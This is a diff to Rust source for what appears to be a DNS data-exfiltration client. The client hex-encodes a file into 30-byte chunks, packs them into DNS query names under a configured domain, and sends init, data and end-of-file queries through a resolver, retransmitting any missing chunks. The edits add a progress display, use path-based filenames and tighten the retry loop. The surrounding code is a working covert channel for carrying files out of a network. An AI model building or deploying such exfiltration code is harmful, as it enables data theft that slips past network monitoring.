@@ -3,7 +3,9 @@ use hickory_client::client::{AsyncClient, ClientHandle};
 use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
 use hickory_proto::udp::UdpClientStream;
 use rand::Rng;
+use std::io::Write;
 use std::net::SocketAddr;
+use std::path::PathBuf;
 use std::str::FromStr;
 use tokio::net::UdpSocket as TokioUdpSocket;
 use tokio::time::{Duration, sleep};
@@ -12,7 +14,7 @@ const CHUNK_SIZE: usize = 30;
 
 #[derive(Clone, Debug)]
 pub struct ExfilPayload {
-    pub filename: String,
+    pub filename: PathBuf,
     pub data: Vec<u8>,
 }
 
@@ -22,6 +24,7 @@ pub struct ClientConfig {
     pub resolver_ip: String,
     pub port: u16,
     pub rate_limit_ms: u64,
+    pub progress: bool,
 }
 
 pub struct Client {
@@ -79,10 +82,17 @@ impl Client {
     ) -> Result<(), DnsexError> {
         for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
             let data_fqdn = self.build_fqdn(&hex::encode(chunk), seq, session_id, 'd');
-            println!("Sending chunk {}/{}: {}", seq + 1, total_chunks, data_fqdn);
+
+            if self.config.progress {
+                let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
+                print!("\r[{}/{} ({:.2}%)]", seq + 1, total_chunks, progress);
+                let _ = std::io::stdout().flush();
+            }
+
             self.send_query(client, &data_fqdn).await?;
         }
 
+        println!();
         Ok(())
     }
 
@@ -93,8 +103,6 @@ impl Client {
         total_chunks: usize,
     ) -> Result<Vec<usize>, DnsexError> {
         let fin_fqdn = self.build_fqdn(&hex::encode("EOF"), total_chunks, session_id, 'f');
-        println!("Sending FIN packet: {}", fin_fqdn);
-
         let responses = self.send_query(client, &fin_fqdn).await?;
         let mut missing: Vec<usize> = Vec::new();
 
@@ -117,7 +125,6 @@ impl Client {
         client: &mut AsyncClient,
         data: &[u8],
         session_id: &str,
-        total_chunks: usize,
         missing: &[usize],
     ) -> Result<(), DnsexError> {
         let chunks: Vec<&[u8]> = data.chunks(CHUNK_SIZE).collect();
@@ -125,7 +132,6 @@ impl Client {
         for &seq in missing {
             if seq < chunks.len() {
                 let data_fqdn = self.build_fqdn(&hex::encode(chunks[seq]), seq, session_id, 'd');
-                println!("Resending missing chunk {}/{}", seq + 1, total_chunks);
                 self.send_query(client, &data_fqdn).await?;
             }
         }
@@ -137,14 +143,22 @@ impl Client {
         let mut client = self.get_client().await?;
         let session_id = Client::generate_session_id();
         let total_chunks = payload.data.chunks(CHUNK_SIZE).count();
+        let filename = payload
+            .filename
+            .file_name()
+            .unwrap()
+            .to_string_lossy()
+            .to_string();
 
         println!(
-            "Exfiltrating {} chunks to {}",
-            total_chunks, self.config.domain
+            "Exfiltrating {} to {}",
+            payload.filename.to_string_lossy(),
+            self.config.domain
         );
 
-        self.send_init(&mut client, &payload.filename, &session_id, total_chunks)
+        self.send_init(&mut client, &filename, &session_id, total_chunks)
             .await?;
+
         self.send_data(&mut client, &payload.data, &session_id, total_chunks)
             .await?;
 
@@ -156,19 +170,17 @@ impl Client {
                 .send_fin(&mut client, &session_id, total_chunks)
                 .await?;
 
+            if missing.is_empty() {
+                break;
+            }
+
             if retries >= MAX_RETRIES {
                 println!("transfer failed after: {} retries", MAX_RETRIES);
                 break;
             }
 
-            self.send_missing(
-                &mut client,
-                &payload.data,
-                &session_id,
-                total_chunks,
-                &missing,
-            )
-            .await?;
+            self.send_missing(&mut client, &payload.data, &session_id, &missing)
+                .await?;
             retries += 1;
         }
 
